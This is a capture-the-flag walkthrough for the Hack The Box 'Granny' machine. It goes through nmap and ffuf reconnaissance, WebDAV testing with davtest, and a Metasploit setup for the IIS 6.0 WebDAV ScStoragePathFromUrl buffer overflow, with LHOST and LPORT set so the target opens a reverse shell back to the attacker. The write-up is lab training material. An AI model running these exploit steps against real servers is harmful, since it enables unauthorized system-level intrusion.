# Granny [HTB](https://app.hackthebox.com/machines/Granny)
![granny-01]()

## Recon

After adding the target to our `/etc/hosts` file, we can start scanning it with:

```bash
nmap -sC -sV -A -p- granny.htb -oN nmap.results
```

![nmap-res-02]()

We have the following:

+ An IIS v6.0 server running on port 80.

It appears that the server is running an extremly outdated IIS server, as Microsoft released IIS v6.0 with
the 2003 Windows Server on May 28, 2003, which reached End-of-Life on Jul 14, 2015. [source](https://learn.microsoft.com/en-us/lifecycle/products/internet-information-services-iis) 

I'm thinking public exploits. 


### IIS Port 80

With a quick Goolge search, we can find a public exploit for IIS V6.0 on [Exploit-DB](https://www.exploit-db.com/exploits/41738): 

![payload-03]()

This is a python 2 script, exploiting a buffer overflow vulnerability that lays in the `ScStoragePathFromUrl` function of the `WebDAV` Microsoft standard. 

`WebDAV` is an Internet-based open standard that enables editing Web sites over HTTP and HTTPS connections, which also supports file uploads to the server.  

This is not enabled by default, when you install the IIS server role, you need to check a box to enable `WebDAV`, [source](https://learn.microsoft.com/en-us/iis/configuration/system.webserver/webdav/)

The `WebDAV` interface could be on the server root directory, or it could be on a dedicated directory,  It depends on the config file. However, a common location is `/webdav` lets give it a shot:

![find-04]()

It says the service is unavailable, maybe its disabled? Lets try directory busting to be sure:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/IIS.fuzz.txt -u http://gra
nny.htb/FUZZ
``` 

![ffuf-05]()

Lets open this directory:

![vti-06]()

Looks interesting, but were not sure if its WebDAV enabled. We can verify this with:

```bash
davtest -url http://granny.htb/_vti_bin
```

![davtest-07]()

The file upload failed, that's one exploit vector, But the `WebDAV` connection succeeded, which means we 
can try the buffer-overflow exploit we found earlier for IIS 6.0. 

I've tried the python script from exploit-DB, the issue is with the shellcode, which opens `calc.exe`, 
instead of esteblishing a reverse shell. So i found another exploit on [Github](https://github.com/danigargu/explodingcan/tree/master). This one specifies that the shellcode must be alphanumerically encoded, Iv'etried it, didnt work for me. I tried a combination of different shellcodes and exploits, nothing worked for me. 


So instead i decided to go for the Metasploit implemantation of the exploit. 

```bash
use windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS granny.htb
set LHOST tun0
set LPORT 443
set TARGETURI /_vti_bin
```

![options-08]()

From here we can run `exploit`:

![root-09]()


Not only do we get a shell, we get full system access. However do note, this is in fact a 2003 Windows 
server, the directory structure is different from modern Windows systems. The user's folders are in `C:\Documents and Stettings`. 

